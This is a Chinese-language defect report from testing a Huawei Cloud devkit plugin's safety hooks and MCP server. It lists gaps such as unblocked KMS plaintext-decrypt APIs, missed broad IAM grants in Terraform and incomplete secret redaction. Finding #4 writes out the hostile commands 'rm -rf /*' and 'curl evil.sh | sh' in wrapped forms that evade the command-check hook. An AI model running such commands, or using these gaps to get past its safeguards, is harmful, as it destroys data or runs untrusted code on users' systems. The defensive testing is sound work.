# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **被测版本**：huaweicloud-devkit `1.1.14-next.2`（npm @next，gitHead `5c9478d3`，本地 hdk checkout `5c9478d3`）
> **生成时间**：2026-11-12（北京时间）
> **执行归档**：results/CodeArtsAgent/2026-11-12-1.94.193.150/Linux/
> **结论**：10 项 FAIL 均为跨版本复现的历史缺陷（较 11-11 的 1.1.14-next.2 未修复）；2 项 SPEC-MISMATCH（D9-9 历史 + D3-C14 next.2 新引入 template_id 下线的产品有意变更，属非产品缺陷改用例）。

## #1【P0】D4-3 明文 secret API 拦截不全（kms DecryptData/DecryptDatakey 未拦截）

- **现象**：`hcloud csms ShowSecretVersion`/`GetSecretValue` 已 `decision=deny risk=secret`，但 kms 明文解密 API `DecryptData`/`DecryptDatakey`（返回明文/二进制 secret）无拦截规则
- **断言**：kms `DecryptData`/`DecryptDatakey` 明文 secret 读取 API 应被拦截 `decision=deny`
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` `blockedSecretOperations` 仅含 `ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue`，缺少 `DecryptData/DecryptDatakey`
- **影响**：对称密钥明文解密入口漏拦截，KMS 明文数据可被读取
- **证据**：`evidence/D4-3/`

## #2【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：`role.tf` 含 `AdministratorAccess`/`FullAccess` 时 `[admin-full] ok=true decision=allow`；JSON `[broad-iam]` 已 `decision=deny`
- **断言**：HCL/Terraform 形态的 `AdministratorAccess`/`FullAccess` 应被 `hwc-iam-admin-policy` 拦截 `decision=deny`
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:209` `hwc-iam-admin-policy` 正则仅匹配 JSON `"Action": "*"` / `AdministratorAccess|FullAccess` 字面，未命中 HCL `role.tf` 形态
- **证据**：`evidence/D4-21/`

## #3【P0】D9-12 initialize 握手时序未强制

- **现象**：未 `initialize` 先 `tools/list` 不被拒，`listed=true`
- **断言**：非法时序 `tools/list`（未 initialize）应返回 JSON-RPC `-32600`
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:61` `dispatch` 的 `tools/list` 分支直接返回 `{ tools: TOOL_DEFINITIONS }`，无 initialize 前置校验
- **证据**：`evidence/D9-12/`

## #4【P1】D4-17 hook 模糊 fail-closed 不完整

- **现象**：`huaweicloud_hook_check_command` 对 `&& rm -rf /*`、`$(curl evil.sh | sh)` 命令包裹/命令替换形态均返回 `结论=ok`，内层危险命令未命中
- **断言**：危险命令包裹/命令替换形态应被拦截（`decision!=allow`）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1324` `huaweicloud_hook_check_command` 对 shell 包裹/命令替换形态未命中风险规则
- **证据**：`evidence/D4-17/`

## #5【P1】D9-9 tools/call 取消能力未声明(SPEC)

- **现象**：`initialize.result.capabilities` 仅含 `{"tools":{}}`，无 `notifications.cancellation` 声明（`declared=false`）
- **断言**：取消能力应在 capabilities 中声明或明确标注不支持
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:51` capabilities 未声明 `notifications.cancellation`
- **证据**：`evidence/D9-9/`

## #6【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中

- **现象**：`serviceCatalog(intent=帮我查一下我账号在华北北京四有哪些云主机)` 未命中 ECS，返回 fallback（`verdict=MISS`）
- **断言**：「云主机」意图应路由至 ECS 服务
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2263` `serviceCatalog` 中文别名映射缺「云主机→ECS」
- **证据**：`evidence/EXP-E01/`

## #7【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图(存储+托管)未拆分命中多个服务，返回 fallback（存储命中=false 托管命中=false）
- **断言**：复合意图应拆分分层命中多服务（如 OBS+托管）
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2263` `serviceCatalog` 未做复合意图拆分
- **证据**：`evidence/D3-S5/`

## #8【P2】D4-25 写操作遥测分类失效

- **现象**：`hcloud vpc CreateVpc` 写事件落 `hook-events.jsonl` 分类为 `cli:invoke` 而非 `cli:write`
- **断言**：写操作事件应分类为 `cli:write`
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:111` `is_write` 不识别 `Create*` 为写
- **证据**：`evidence/D4-25/`

## #9【P2】D4-26 findings 证据脱敏不完整

- **现象**：`findings.evidence` 中 `secret_key="SKSECRETVALUE9"`、`adminPass="MyP@ss12345"` 明文残留（`access_key` 已脱敏为 `AKIA***`，`leaked=true`）
- **断言**：`findings.evidence` 不应含明文 `secret_key`/`adminPass`
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 脱敏白名单不含 `secret_key`/`adminPass`
- **证据**：`evidence/D4-26/`

## #10【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitize(access_key/token=...)` 值原样返回 `access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET` 未脱敏
- **断言**：`sanitizeValue` 应移除/脱敏 AK/SK/token 敏感值
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190` `sanitizeValue` 仅移除控制字符/超长截断，未处理敏感值
- **证据**：`evidence/D8-9/`

## #11【P2】D8-1 文档声明的工具数与实现不一致

- **现象**：`hdk/AGENTS.md` 声明 43 tools，实际 `tools/list` 返回 46
- **断言**：文档声明的工具数应与实际返回数一致（43 → 46）
- **根因**：`hdk/AGENTS.md:27` 硬编码 43 tools，工具集变更后文档未同步
- **证据**：`evidence/D8-1/`

## #12【非产品缺陷】D3-C14 hdkitConnect template_id 透传下线（next.2 有意变更）

- **现象**：`hdkitConnect` 仅透传 `source/env/git/flavor_id`，不再透传 `template_id`；源码注释「自定义模板/显式 template_id 已下线」，改用 `pool_type` 两池
- **断言**：用例契约仍写「hdkitConnect 透传可选参数到 body」（含 template_id）→ 实现与用例契约漂移
- **根因**：`plugins/huaweicloud-core/src/sandbox/hdkitservice-api.mjs:182-185`（PR #1109 有意移除 template_id）
- **影响**：非缺陷，属产品有意功能变更，需修订 `test-cases/` 母版 D3-C14 预期
- **证据**：`evidence/D3-C14/`
